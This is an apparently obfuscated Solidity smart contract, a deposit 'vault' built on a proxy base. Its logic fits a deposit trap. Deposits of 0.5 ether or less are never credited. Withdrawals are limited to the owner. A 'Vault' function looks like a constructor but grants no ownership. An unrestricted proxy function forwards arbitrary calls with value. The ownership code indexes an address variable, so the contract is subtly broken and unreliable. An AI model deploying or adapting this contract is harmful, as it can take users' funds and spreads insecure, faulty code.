pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner { if (msg.sender == x[0]) _; }
    address x = msg.sender;
    
    function transferOwner(address _owner) public onlyOwner { x[0] = _owner; }
    
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    mapping (address => uint256) public Deposits;
    address y;
    
    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            y = msg.sender;
            e();
        }
    }
    
    function e() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 z) public onlyOwner {
        if (z > 0 && Deposits[msg.sender] >= z) {
            msg.sender.transfer(z);
        }
    }
}